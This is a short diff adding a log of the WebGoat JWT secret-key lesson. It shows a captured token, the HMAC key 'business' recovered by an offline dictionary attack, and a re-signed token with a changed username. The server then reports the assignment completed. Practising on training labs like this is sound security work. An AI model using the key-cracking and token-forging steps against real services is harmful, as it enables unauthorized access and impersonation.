@@ -1,0 +1,9 @@
+### V5 offline dictionary attack on token from GET /JWT/secret/gettoken
+>>> token: eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc5NTY5MDE2OCwiZXhwIjoxNzk1NjkwMjI4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.fl3WWwmm1kS0YdFZfSkLKlq3F_gPk8b7cUHq6unS7iA
+<<< recovered key: business
+
+### V5 POST /JWT/secret with re-signed token (username=WebGoat)
+>>> POST /WebGoat/JWT/secret  token=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTc5NTY5MDE2OCwiZXhwIjoxNzk1NjkwMjI4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0Lm9yZyIsIlJvbGUiOlsiTWFuYWdlciJdfQ.A8xZ2dkVzKh3MenYFA-DDsuKOmu_WxSxF6JImiSWU7Q
+<<< HTTP 200
+<<< { "lessonCompleted" : true, "feedback" : "Congratulations. You have successfully completed the assignment.", "feedbackArgs" : null, "output" : null, "outputArgs" : null, "assignment" : "JWTSecretKeyEndpoint", "attemptWasMade" : true }
+
